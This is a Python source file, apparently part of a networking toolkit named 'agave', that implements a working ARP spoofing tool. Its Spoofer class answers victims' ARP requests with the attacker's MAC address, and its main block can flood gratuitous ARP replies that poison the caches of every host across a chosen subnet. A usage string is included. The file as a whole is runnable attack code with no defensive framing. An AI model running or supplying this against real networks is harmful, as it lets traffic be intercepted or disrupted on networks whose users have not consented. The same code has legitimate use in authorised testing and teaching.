"""ARP Spoofing.

Note:
	The module provides a script to poisons the ARP cache of the victims
	(default to anyone) for the target subnet. Additionally, gratuitous
	reply can be sent to the victims with the option -f. 

Usage:
	python3 -m agave.arp.spoof <target: subnet|ip> [<victim: subnet|ip>] [-f]

"""
from agave.core.helpers import Job, SocketAddress
from agave.core.arp import ARP, OPERATION_REQUEST
from agave.core.ethernet import ETHER_TYPE_ARP, MACAddress
from agave.nic.interfaces import NetworkInterface
from .utils import create_filter, _parse, _create_socket
from .resolve import resolve
from ipaddress import IPv4Address, IPv4Network
from typing import Callable, Tuple


class Spoofer(Job):

	__slots__ = ("filter", "messages_to_flood", "mac")

	def __init__(
		self,
		sock: "socket.socket",
		mac: MACAddress,
		request_filter: Callable[[ARP], bool],
		messages_to_flood: Tuple[bytes, SocketAddress],
		**kwargs
	):
		super().__init__(sock, **kwargs)
		if messages_to_flood is None or messages_to_flood == []:
			self.disable_loop()
		self.mac = mac
		self.filter = request_filter
		self.messages_to_flood = messages_to_flood

	def loop(self) -> bool:
		for packet, address in self.messages_to_flood:
			self.sock.sendto(packet, address)
		return True

	def process(self, data: bytes, address: SocketAddress) -> None:
		_, arp = _parse(data)
		if self.filter(arp):
			self.sock.sendto(
				arp.reply(self.mac.address),
				(address[0], address[1])
			)


if __name__ == "__main__":

	import sys


	try:
		# Parses arguments
		target_subnet = IPv4Network(sys.argv[1])
		victim_subnet = None
		interface = NetworkInterface.get_by_host(target_subnet.network_address)
		if len(sys.argv) > 2:
			victim_subnet = IPv4Network(sys.argv[2])
		gratuitous = True if len(sys.argv) > 3 and sys.argv[3] == "-f" else False
		# Initialize
		sock = _create_socket()
		messages = []
		# Builds gratuitous replies
		if gratuitous is True:
			addr = (interface.name, ETHER_TYPE_ARP)
			print("[INFO] Discovering hosts in the subnet...")
			victims = list(resolve(victim_subnet, interface, sock=sock))
			print("[INFO] Building gratuitous replies for the following hosts:")
			print("\n".join(map(lambda x: "\t- " + str(x[1]), victims)))
			for sender in target_subnet.hosts():
				for victim_mac, victim_ip in victims:
					messages.append((
						ARP.is_at(
							interface.mac, sender,
							victim_mac,victim_ip
						),
						addr
					))
		# Builds job		
		job = Spoofer(
			sock,
			interface.mac,
			create_filter(OPERATION_REQUEST, sender=victim_subnet, target=target_subnet),
			messages,
			interval=(1 if gratuitous else 3600),
			wait=0
		)
		# Running
		print("[INFO] Running...")
		job.run()

	except KeyboardInterrupt:
		pass
	except BaseException as e:
		print(__doc__)
		print(f"[ERROR] {e}")

